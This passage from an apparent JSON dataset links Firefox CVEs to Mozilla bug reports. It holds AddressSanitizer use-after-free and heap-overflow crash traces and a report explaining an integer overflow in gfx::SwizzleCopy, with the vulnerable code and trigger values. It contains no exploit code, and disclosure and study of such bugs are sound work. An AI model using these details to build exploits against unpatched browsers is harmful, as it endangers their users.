/builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:299 #43 0x7f6e3c81c960 in XRE_InitChildProcess(int, char**, XREChildData const*) /builds/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:719:34 #44 0x4f50dc in content_process_main /builds/worker/workspace/build/src/browser/app/../../ipc/contentproc/plugin-container.cpp:50:30 #45 0x4f50dc in main /builds/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:280 #46 0x7f6e507d882f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f) #47 0x42476c in _start (/fuzzer3/firefox/firefox+0x42476c) 0x61500021439c is located 28 bytes inside of 472-byte region [0x615000214380,0x615000214558) freed by thread T0 (file:// Content) here: #0 0x4c5172 in __interceptor_free /builds/worker/workspace/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:68:3 #1 0x7f6e30a18f30 in SnowWhiteKiller::~SnowWhiteKiller() /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:2729:25 #2 0x7f6e30a2114f in FreeSnowWhite /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:2917:3 #3 0x7f6e30a2114f in nsCycleCollector::BeginCollection(ccType, nsICycleCollectorListener*) /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:3925 #4 0x7f6e30a2065d in nsCycleCollector::Collect(ccType, js::SliceBudget&, nsICycleCollectorListener*, bool) /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:3746:9 #5 0x7f6e30a244f2 in nsCycleCollector_collect(nsICycleCollectorListener*) /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:4315:21 #6 0x7f6e33ec20de in nsJSContext::CycleCollectNow(nsICycleCollectorListener*) /builds/worker/workspace/build/src/dom/base/nsJSEnvironment.cpp:1488:3 #7 0x7f6e35c574ca in mozilla::dom::FuzzingFunctionsBinding::cycleCollect(JSContext*, unsigned int, JS::Value*) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/FuzzingFunctionsBinding.cpp:54:3 #8 0x7f6e3cb05ff7 in CallJSNative /builds/worker/workspace/build/src/js/src/vm/JSContext-inl.h:280:15 #9 0x7f6e3cb05ff7 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:467 #10 0x7f6e3caf06bf in CallFromStack /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:522:12 #11 0x7f6e3caf06bf in Interpret(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3086 #12 0x7f6e3cad6d63 in js::RunScript(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:417:12 #13 0x7f6e3cb05d75 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:489:15 #14 0x7f6e3cb06ff2 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:535:10 #15 0x7f6e3d637c2a in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/jsapi.cpp:2989:12 #16 0x7f6e359cca75 in mozilla::dom::EventListener::HandleEvent(JSContext*, JS::Handle<JS::Value>, mozilla::dom::Event&, mozilla::ErrorResult&) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/EventListenerBinding.cpp:51:8 #17 0x7f6e36972c7e in HandleEvent<mozilla::dom::EventTarget *> /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/EventListenerBinding.h:66:12 #18 0x7f6e36972c7e in mozilla::EventListenerManager::HandleEventSubType(mozilla::EventListenerManager::Listener*, mozilla::dom::Event*, mozilla::dom::EventTarget*) /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1118 #19 0x7f6e369743db in mozilla::EventListenerManager::HandleEventInternal(nsPresContext*, mozilla::WidgetEvent*, mozilla::dom::Event**, mozilla::dom::EventTarget*, nsEventStatus*) /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1288:20 #20 0x7f6e3695ea87 in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&) /builds/worker/workspace/build/src/dom/events/EventDispatcher.cpp:560:14 #21 0x7f6e36962583 in mozilla::EventDispatcher::Dispatch(nsISupports*, nsPresContext*, mozilla::WidgetEvent*, mozilla::dom::Event*, nsEventStatus*, mozilla::EventDispatchingCallback*, nsTArray<mozilla::dom::EventTarget*>*) /builds/worker/workspace/build/src/dom/events/EventDispatcher.cpp:961:9 #22 0x7f6e36964abb in mozilla::EventDispatcher::DispatchDOMEvent(nsISupports*, mozilla::WidgetEvent*, mozilla::dom::Event*, nsPresContext*, nsEventStatus*) /builds/worker/workspace/build/src/dom/events/EventDispatcher.cpp #23 0x7f6e33ea7bf8 in nsINode::DispatchEvent(mozilla::dom::Event&, mozilla::dom::CallerType, mozilla::ErrorResult&) /builds/worker/workspace/build/src/dom/base/nsINode.cpp:1079:5 #24 0x7f6e36982ea3 in mozilla::dom::EventTarget::DispatchEvent(mozilla::dom::Event&) /builds/worker/workspace/build/src/dom/events/EventTarget.cpp:204:13 #25 0x7f6e368f8e8c in mozilla::AsyncEventDispatcher::Run() /builds/worker/workspace/build/src/dom/events/AsyncEventDispatcher.cpp:68:12 #26 0x7f6e339f904f in nsContentUtils::RemoveScriptBlocker() /builds/worker/workspace/build/src/dom/base/nsContentUtils.cpp:5635:15 #27 0x7f6e33dd7027 in nsDocument::EndUpdate(unsigned int) /builds/worker/workspace/build/src/dom/base/nsDocument.cpp:5105:3 #28 0x7f6e36d5849c in nsHTMLDocument::EndUpdate(unsigned int) /builds/worker/workspace/build/src/dom/html/nsHTMLDocument.cpp:2120:15 #29 0x7f6e38a79e1a in ~mozAutoDocConditionalContentUpdateBatch /builds/worker/workspace/build/src/dom/base/mozAutoDocUpdate.h:83:18 #30 0x7f6e38a79e1a in ModifyDeclaration<(lambda at /builds/worker/workspace/build/src/layout/style/nsDOMCSSDeclaration.cpp:297:5)> /builds/worker/workspace/build/src/layout/style/nsDOMCSSDeclaration.cpp:287 #31 0x7f6e38a79e1a in nsDOMCSSDeclaration::ParsePropertyValue(nsCSSPropertyID, nsTSubstring<char16_t> const&, bool, nsIPrincipal*) /builds/worker/workspace/build/src/layout/style/nsDOMCSSDeclaration.cpp:295 #32 0x7f6e34373c9a in SetMargin /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/ServoCSSPropList.h:456:1 #33 0x7f6e34373c9a in mozilla::dom::CSS2PropertiesBinding::set_margin(JSContext*, JS::Handle<JSObject*>, nsDOMCSSDeclaration*, JSJitSetterCallArgs) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/CSS2PropertiesBinding.cpp:31017 #34 0x7f6e3623e223 in bool mozilla::dom::binding_detail::GenericSetter<mozilla::dom::binding_detail::NormalThisPolicy>(JSContext*, unsigned int, JS::Value*) /builds/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:3204:8 #35 0x7f6e3cb05ff7 in CallJSNative /builds/worker/workspace/build/src/js/src/vm/JSContext-inl.h:280:15 #36 0x7f6e3cb05ff7 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:467 #37 0x7f6e3cb08c26 in InternalCall /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:516:12 #38 0x7f6e3cb08c26 in Call /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:535 #39 0x7f6e3cb08c26 in js::CallSetter(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::Handle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:664 previously allocated by thread T0 (file:// Content) here: #0 0x4c54b3 in malloc /builds/worker/workspace/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:88:3 #1 0x4f5f7d in moz_xmalloc /builds/worker/workspace/build/src/memory/mozalloc/mozalloc.cpp:70:17 #2 0x7f6e36bb06b9 in operator new /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/mozalloc.h:156:12 #3 0x7f6e36bb06b9 in NS_NewHTMLInputElement(already_AddRefed<mozilla::dom::NodeInfo>&&, mozilla::dom::FromParser) /builds/worker/workspace/build/src/dom/html/HTMLInputElement.cpp:120 #4 0x7f6e36d38569 in CreateHTMLElement(unsigned int, already_AddRefed<mozilla::dom::NodeInfo>&&, mozilla::dom::FromParser) /builds/worker/workspace/build/src/dom/html/nsHTMLContentSink.cpp:252:41 #5 0x7f6e33a21937 in nsContentUtils::NewXULOrHTMLElement(mozilla::dom::Element**, mozilla::dom::NodeInfo*, mozilla::dom::FromParser, nsAtom*, mozilla::dom::CustomElementDefinition*) /builds/worker/workspace/build/src/dom/base/nsContentUtils.cpp:10017:18 #6 0x7f6e36d384c8 in NS_NewHTMLElement(mozilla::dom::Element**, already_AddRefed<mozilla::dom::NodeInfo>&&, mozilla::dom::FromParser, nsAtom*, mozilla::dom::CustomElementDefinition*) /builds/worker/workspace/build/src/dom/html/nsHTMLContentSink.cpp:235:10 #7 0x7f6e33e211a0 in nsIDocument::CreateHTMLElement(nsAtom*) /builds/worker/workspace/build/src/dom/base/nsDocument.cpp:12378:28 #8 0x7f6e390c5dbe in nsNumberControlFrame::MakeAnonymousElement(mozilla::dom::Element**, nsTArray<nsIAnonymousContentCreator::ContentInfo>&, nsAtom*, mozilla::CSSPseudoElementType) /builds/worker/workspace/build/src/layout/forms/nsNumberControlFrame.cpp:331:40 #9 0x7f6e390c63eb in nsNumberControlFrame::CreateAnonymousContent(nsTArray<nsIAnonymousContentCreator::ContentInfo>&) /builds/worker/workspace/build/src/layout/forms/nsNumberControlFrame.cpp:378:8 #10 0x7f6e38bff0ae in nsCSSFrameConstructor::GetAnonymousContent(nsIContent*, nsIFrame*, nsTArray<nsIAnonymousContentCreator::ContentInfo>&) /builds/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:4172:26 #11 0x7f6e38bf27fe in nsCSSFrameConstructor::ProcessChildren(nsFrameConstructorState&, nsIContent*, mozilla::ComputedStyle*, nsContainerFrame*, bool, nsFrameItems&, bool, PendingBinding*, nsIFrame*) /builds/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:10265:3 #12 0x7f6e38c086e1 in nsCSSFrameConstructor::ConstructFrameFromItemInternal(nsCSSFrameConstructor::FrameConstructionItem&, nsFrameConstructorState&, nsContainerFrame*, nsFrameItems&) /builds/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:4041:9 #13 0x7f6e38c11390 in nsCSSFrameConstructor::ConstructFramesFromItem(nsFrameConstructorState&, nsCSSFrameConstructor::FrameConstructionItemList::Iterator&, nsContainerFrame*, nsFrameItems&) /builds/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:6073:3 #14 0x7f6e38bf1ee5 in nsCSSFrameConstructor::ConstructFramesFromItemList(nsFrameConstructorState&, nsCSSFrameConstructor::FrameConstructionItemList&, nsContainerFrame*, bool, nsFrameItems&) /builds/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:10144:5 #15 0x7f6e38c1e370 in nsCSSFrameConstructor::ContentAppended(nsIContent*, nsCSSFrameConstructor::InsertionKind) /builds/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:7267:3 #16 0x7f6e38bad73f in mozilla::RestyleManager::ProcessRestyledFrames(nsStyleChangeList&) /builds/worker/workspace/build/src/layout/base/RestyleManager.cpp:1401:27 #17 0x7f6e38bbaa95 in mozilla::RestyleManager::DoProcessPendingRestyles(mozilla::ServoTraversalFlags) /builds/worker/workspace/build/src/layout/base/RestyleManager.cpp:3000:9 #18 0x7f6e38b72723 in ProcessPendingRestyles /builds/worker/workspace/build/src/layout/base/RestyleManager.cpp:3077:3 #19 0x7f6e38b72723 in mozilla::PresShell::DoFlushPendingNotifications(mozilla::ChangesToFlush) /builds/worker/workspace/build/src/layout/base/PresShell.cpp:4316 #20 0x7f6e33df3d68 in FlushPendingNotifications /builds/worker/workspace/build/src/obj-firefox/dist/include/nsIPresShell.h:592:5 #21 0x7f6e33df3d68 in nsIDocument::FlushPendingNotifications(mozilla::ChangesToFlush) /builds/worker/workspace/build/src/dom/base/nsDocument.cpp:7589 #22 0x7f6e33e449d9 in FlushPendingNotifications /builds/worker/workspace/build/src/dom/base/nsDocument.cpp:7528:3 #23 0x7f6e33e449d9 in nsFocusManager::CheckIfFocusable(mozilla::dom::Element*, unsigned int) /builds/worker/workspace/build/src/dom/base/nsFocusManager.cpp:1605 #24 0x7f6e33e40fed in nsFocusManager::SetFocusInner(mozilla::dom::Element*, int, bool, bool) /builds/worker/workspace/build/src/dom/base/nsFocusManager.cpp:1226:36 #25 0x7f6e33e445ca in nsFocusManager::SetFocus(mozilla::dom::Element*, unsigned int) /builds/worker/workspace/build/src/dom/base/nsFocusManager.cpp:518:3 #26 0x7f6e36cd7df4 in mozilla::dom::HTMLTextAreaElement::Select() /builds/worker/workspace/build/src/dom/html/HTMLTextAreaElement.cpp:156:11 #27 0x7f6e360533b7 in mozilla::dom::HTMLTextAreaElementBinding::select(JSContext*, JS::Handle<JSObject*>, mozilla::dom::HTMLTextAreaElement*, JSJitMethodCallArgs const&) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/HTMLTextAreaElementBinding.cpp:1390:9 #28 0x7f6e36240b21 in bool mozilla::dom::binding_detail::GenericMethod<mozilla::dom::binding_detail::NormalThisPolicy, mozilla::dom::binding_detail::ThrowExceptions>(JSContext*, unsigned int, JS::Value*) /builds/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:3260:13 #29 0x7f6e3cb05ff7 in CallJSNative /builds/worker/workspace/build/src/js/src/vm/JSContext-inl.h:280:15 #30 0x7f6e3cb05ff7 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:467 #31 0x7f6e3caf06bf in CallFromStack /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:522:12 #32 0x7f6e3caf06bf in Interpret(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3086 #33 0x7f6e3cad6d63 in js::RunScript(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:417:12 #34 0x7f6e3cb05d75 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:489:15 #35 0x7f6e3cb06ff2 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:535:10 SUMMARY: AddressSanitizer: heap-use-after-free /builds/worker/workspace/build/src/dom/base/nsINode.h:1644:12 in GetBoolFlag Shadow bytes around the buggy address: 0x0c2a8003a820: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c2a8003a830: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c2a8003a840: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c2a8003a850: fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa 0x0c2a8003a860: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa =>0x0c2a8003a870: fd fd fd[fd]fd fd fd fd fd fd fd fd fd fd fd fd 0x0c2a8003a880: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c2a8003a890: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c2a8003a8a0: fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa 0x0c2a8003a8b0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c2a8003a8c0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb ==10502==ABORTING"
      }
    ],
    "CVE-2018-12361": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1463244",
        "title": "Buffer Overflow in gfx::SwizzleCopy",
        "description": "User Agent: Mozilla/5.0 (Windows NT 6.1; rv:52.0) Gecko/20100101 Firefox/52.0 Build ID: 20100101 Steps to reproduce: gfx::SwizzleCopy (gfx/2d/Swizzle.cpp) is unsafe: static void SwizzleCopy(const uint8_t* aSrc, int32_t aSrcGap, uint8_t* aDst, int32_t aDstGap, IntSize aSize, int32_t aBPP) { if (aSrc != aDst) { int32_t rowLength = aBPP * aSize.width; // (1) for (int32_t height = aSize.height; height > 0; height--) { memcpy(aDst, aSrc, rowLength); // (0) aSrc += rowLength + aSrcGap; // (2) aDst += rowLength + aDstGap; // (3) } } } At (1), rowLength can overflow and become a very large negative value. For example, if aSize.width = 0x20000000, it will overflow to -2147483648 at 4 BPP. Then, the overflowed value is used at (2) and (3) to calculate pointers, that may either underflow the currently owned memory, or even wrap around aSrc/aDst on x86 arch. Then, the call to memcpy() at (0) with wrongly calculated pointers and count can cause an out of bound access. In addition, both aSrcGap and aDstGap are calculated in the same unsafe manner in the caller: bool SwizzleData(const uint8_t* aSrc, int32_t aSrcStride, SurfaceFormat aSrcFormat, uint8_t* aDst, int32_t aDstStride, SurfaceFormat aDstFormat, const IntSize& aSize) { if (aSize.IsEmpty()) { return true; } IntSize size = CollapseSize(aSize, aSrcStride, aDstStride); // (4) // Find gap from end of row to the start of the next row. int32_t srcGap = aSrcStride - BytesPerPixel(aSrcFormat) * aSize.width; // (5) int32_t dstGap = aDstStride - BytesPerPixel(aDstFormat) * aSize.width; // (6) MOZ_ASSERT(srcGap >= 0 && dstGap >= 0); // (7) [...] if (aSrcFormat == aDstFormat) { // If the formats match, just do a generic copy. SwizzleCopy(aSrc, srcGap, aDst, dstGap, size, BytesPerPixel(aSrcFormat)); return true; } [...] } At (5) and (6), srcGap and dstGap can overflow in exactly the same way as described above. The possibly overflowed values are then passed to SwizzleCopy and used to calculate pointer values. Here an example of the crash on Firefox 59.0.2 which happens when aDst underflows and wraps around: https://crash-stats.mozilla.com/report/index/19b58581-7c59-4227-95c3-9d0b30180422 And the crashes which happen when aDst or aSrc point to unowned memory: aSrc: https://crash-stats.mozilla.com/report/index/aa3f07a1-6ed3-4aad-ae17-ed1170180424 aDst: https://crash-stats.mozilla.com/report/index/905535d1-49f9-4657-8e3a-8b73d0180427 The input graphics region which causes incorrect calculations is sanitized in a few places before the call to SwizzleCopy, but it is not sanitized properly. For example, at (4) the call to CollapseSize (/gfx/2d/Swizzle.cpp) does check that aSize.width * aSize.height is within safe bounds of int32, but the check only happens if specific conditions are met. Also, it does not account for the BPP multiplier which is used at (1), (5), (6): static inline IntSize CollapseSize(const IntSize& aSize, int32_t aSrcStride, int32_t aDstStride) { if (aSrcStride == aDstStride && aSrcStride == 4 * aSize.width) { CheckedInt32 area = CheckedInt32(aSize.width) * CheckedInt32(aSize.height); if (area.isValid()) { return IntSize(area.value(), 1); } } return aSize; } One more check at (7) is a correct assert, however it's compiled out in release builds. A few more checks happen inside the CopyRect (gfx/2d/DataSurfaceHelpers.cpp) caller of SwizzleData, that again they do not account for the BytesPerPixel multiplier. It would be optimal to insert early checks, for every acquired graphics region, that both values of width * bpp and height * bpp do not overflow int32, ideally with a margin. Because the value of BytesPerPixel is relatively small, such a check would automatically rule out majority of other possible overflows."
      }
    ],
    "CVE-2018-12362": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1452375",
        "title": "AddressSanitizer: heap-buffer-overflow /builds/worker/workspace/build/src/gfx/2d/ssse3-scaler.c:202:16 in ssse3_fetch_horizontal",
        "description": "User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36 Steps to reproduce: tested on Nightly 61.0a1 (2018-04-06) (64-bit) build. Not minimized sample firefox --private-window -no-remote heapbuffer.html Actual results: ==12958==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x6210023424fc at pc 0x7f365bba05bd bp 0x7f3606386790 sp 0x7f3606386788 READ of size 8 at 0x6210023424fc thread T30 (Compositor) #0 0x7f365bba05bc in ssse3_fetch_horizontal /builds/worker/workspace/build/src/gfx/2d/ssse3-scaler.c:202:16 #1 0x7f365bba05bc in ssse3_fetch_bilinear_cover /builds/worker/workspace/build/src/gfx/2d/ssse3-scaler.c:325 #2 0x7f365bba05bc in ssse3_scale_data /builds/worker/workspace/build/src/gfx/2d/ssse3-scaler.c:556 #3 0x7f365c28eb28 in mozilla::layers::AttemptVideoScale(mozilla::layers::TextureSourceBasic*, mozilla::gfx::SourceSurface const*, float, mozilla::gfx::CompositionOp, mozilla::layers::TexturedEffect const*, mozilla::gfx::BaseMatrix<float> const&, mozilla::gfx::RectTyped<mozilla::gfx::UnknownUnits, float> const&, mozilla::gfx::RectTyped<mozilla::gfx::UnknownUnits, float> const&, mozilla::gfx::DrawTarget*, mozilla::gfx::DrawTarget const*) /builds/worker/workspace/build/src/gfx/layers/basic/BasicCompositor.cpp:560:5 #4 0x7f365c25c690 in void mozilla::layers::BasicCompositor::DrawGeometry<mozilla::gfx::RectTyped<mozilla::gfx::UnknownUnits, float> >(mozilla::gfx::RectTyped<mozilla::gfx::UnknownUnits, float> const&, mozilla::gfx::RectTyped<mozilla::gfx::UnknownUnits, float> const&, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&, mozilla::layers::EffectChain const&, float, mozilla::gfx::Matrix4x4Typed<mozilla::gfx::UnknownUnits, mozilla::gfx::UnknownUnits> const&, mozilla::gfx::RectTyped<mozilla::gfx::UnknownUnits, float> const&, bool) /builds/worker/workspace/build/src/gfx/layers/basic/BasicCompositor.cpp:773:13 #5 0x7f365c25af0e in mozilla::layers::BasicCompositor::DrawQuad(mozilla::gfx::RectTyped<mozilla::gfx::UnknownUnits, float> const&, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&, mozilla::layers::EffectChain const&, float, mozilla::gfx::Matrix4x4Typed<mozilla::gfx::UnknownUnits, mozilla::gfx::UnknownUnits> const&, mozilla::gfx::RectTyped<mozilla::gfx::UnknownUnits, float> const&) /builds/worker/workspace/build/src/gfx/layers/basic/BasicCompositor.cpp:644:3 #6 0x7f365bfb24be in mozilla::layers::Compositor::DrawGeometry(mozilla::gfx::RectTyped<mozilla::gfx::UnknownUnits, float> const&, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&, mozilla::layers::EffectChain const&, float, mozilla::gfx::Matrix4x4Typed<mozilla::gfx::UnknownUnits, mozilla::gfx::UnknownUnits> const&, mozilla::gfx::RectTyped<mozilla::gfx::UnknownUnits, float> const&, mozilla::Maybe<mozilla::gfx::PolygonTyped<mozilla::gfx::UnknownUnits> > const&) /builds/worker/workspace/build/src/gfx/layers/Compositor.cpp:227:5 #7 0x7f365c36ef95 in DrawGeometry /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/layers/Compositor.h:304:5 #8 0x7f365c36ef95 in mozilla::layers::ImageHost::Composite(mozilla::layers::Compositor*, mozilla::layers::LayerComposite*, mozilla::layers::EffectChain&, float, mozilla::gfx::Matrix4x4Typed<mozilla::gfx::UnknownUnits, mozilla::gfx::UnknownUnits> const&, mozilla::gfx::SamplingFilter, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&, mozilla::gfx::IntRegionTyped<mozilla::gfx::UnknownUnits> const*, mozilla::Maybe<mozilla::gfx::PolygonTyped<mozilla::gfx::UnknownUnits> > const&) /builds/worker/workspace/build/src/gfx/layers/composite/ImageHost.cpp:298 #9 0x7f365c3c4feb in mozilla::layers::ImageLayerComposite::RenderLayer(mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&, mozilla::Maybe<mozilla::gfx::PolygonTyped<mozilla::gfx::UnknownUnits> > const&)::$_0::operator()(mozilla::layers::EffectChain&, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&) const /builds/worker/workspace/build/src/gfx/layers/composite/ImageLayerComposite.cpp:106:17 #10 0x7f365c373a9e in RenderWithAllMasks<(lambda at /builds/worker/workspace/build/src/gfx/layers/composite/ImageLayerComposite.cpp:104:22)> /builds/worker/workspace/build/src/gfx/layers/composite/LayerManagerComposite.h:738:5 #11 0x7f365c373a9e in mozilla::layers::ImageLayerComposite::RenderLayer(mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&, mozilla::Maybe<mozilla::gfx::PolygonTyped<mozilla::gfx::UnknownUnits> > const&) /builds/worker/workspace/build/src/gfx/layers/composite/ImageLayerComposite.cpp:103 #12 0x7f365c35c3e6 in void mozilla::layers::RenderLayers<mozilla::layers::ContainerLayerComposite>(mozilla::layers::ContainerLayerComposite*, mozilla::layers::LayerManagerComposite*, mozilla::gfx::IntRectTyped<mozilla::RenderTargetPixel> const&, mozilla::Maybe<mozilla::gfx::PolygonTyped<mozilla::gfx::UnknownUnits> > const&) /builds/worker/workspace/build/src/gfx/layers/composite/ContainerLayerComposite.cpp:443:22 #13 0x7f365c3595de in void mozilla::layers::RenderIntermediate<mozilla::layers::ContainerLayerComposite>(mozilla::layers::ContainerLayerComposite*, mozilla::layers::LayerManagerComposite*, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&, RefPtr<mozilla::layers::CompositingRenderTarget>) /builds/worker/workspace/build/src/gfx/layers/composite/ContainerLayerComposite.cpp:554:3 #14 0x7f365c328439 in void mozilla::layers::ContainerPrepare<mozilla::layers::ContainerLayerComposite>(mozilla::layers::ContainerLayerComposite*, mozilla::layers::LayerManagerComposite*, mozilla::gfx::IntRectTyped<mozilla::RenderTargetPixel> const&) /builds/worker/workspace/build/src/gfx/layers/composite/ContainerLayerComposite.cpp:273:9 #15 0x7f365c3276ce in void mozilla::layers::ContainerPrepare<mozilla::layers::ContainerLayerComposite>(mozilla::layers::ContainerLayerComposite*, mozilla::layers::LayerManagerComposite*, mozilla::gfx::IntRectTyped<mozilla::RenderTargetPixel> const&) /builds/worker/workspace/build/src/gfx/layers/composite/ContainerLayerComposite.cpp:238:20 #16 0x7f365c3276ce in void mozilla::layers::ContainerPrepare<mozilla::layers::ContainerLayerComposite>(mozilla::layers::ContainerLayerComposite*, mozilla::layers::LayerManagerComposite*, mozilla::gfx::IntRectTyped<mozilla::RenderTargetPixel> const&) /builds/worker/workspace/build/src/gfx/layers/composite/ContainerLayerComposite.cpp:238:20 #17 0x7f365c3276ce in void mozilla::layers::ContainerPrepare<mozilla::layers::ContainerLayerComposite>(mozilla::layers::ContainerLayerComposite*, mozilla::layers::LayerManagerComposite*, mozilla::gfx::IntRectTyped<mozilla::RenderTargetPixel> const&) /builds/worker/workspace/build/src/gfx/layers/composite/ContainerLayerComposite.cpp:238:20 #18 0x7f365c3276ce in void mozilla::layers::ContainerPrepare<mozilla::layers::ContainerLayerComposite>(mozilla::layers::ContainerLayerComposite*, mozilla::layers::LayerManagerComposite*, mozilla::gfx::IntRectTyped<mozilla::RenderTargetPixel> const&) /builds/worker/workspace/build/src/gfx/layers/composite/ContainerLayerComposite.cpp:238:20 #19 0x7f365c3276ce in void mozilla::layers::ContainerPrepare<mozilla::layers::ContainerLayerComposite>(mozilla::layers::ContainerLayerComposite*, mozilla::layers::LayerManagerComposite*, mozilla::gfx::IntRectTyped<mozilla::RenderTargetPixel> const&) /builds/worker/workspace/build/src/gfx/layers/composite/ContainerLayerComposite.cpp:238:20 #20 0x7f365c32b81e in void mozilla::layers::ContainerPrepare<mozilla::layers::RefLayerComposite>(mozilla::layers::RefLayerComposite*, mozilla::layers::LayerManagerComposite*, mozilla::gfx::IntRectTyped<mozilla::RenderTargetPixel> const&) /builds/worker/workspace/build/src/gfx/layers/composite/ContainerLayerComposite.cpp:238:20 #21 0x7f365c3276ce in void mozilla::layers::ContainerPrepare<mozilla::layers::ContainerLayerComposite>(mozilla::layers::ContainerLayerComposite*, mozilla::layers::LayerManagerComposite*, mozilla::gfx::IntRectTyped<mozilla::RenderTargetPixel> const&) /builds/worker/workspace/build/src/gfx/layers/composite/ContainerLayerComposite.cpp:238:20 #22 0x7f365c3854c0 in mozilla::layers::LayerManagerComposite::Render(mozilla::gfx::IntRegionTyped<mozilla::gfx::UnknownUnits> const&, mozilla::gfx::IntRegionTyped<mozilla::gfx::UnknownUnits> const&) /builds/worker/workspace/build/src/gfx/layers/composite/LayerManagerComposite.cpp:944:18 #23 0x7f365c383244 in mozilla::layers::LayerManagerComposite::UpdateAndRender() /builds/worker/workspace/build/src/gfx/layers/composite/LayerManagerComposite.cpp:533:3 #24 0x7f365c381b26 in mozilla::layers::LayerManagerComposite::EndTransaction(mozilla::TimeStamp const&, mozilla::layers::LayerManager::EndTransactionFlags) 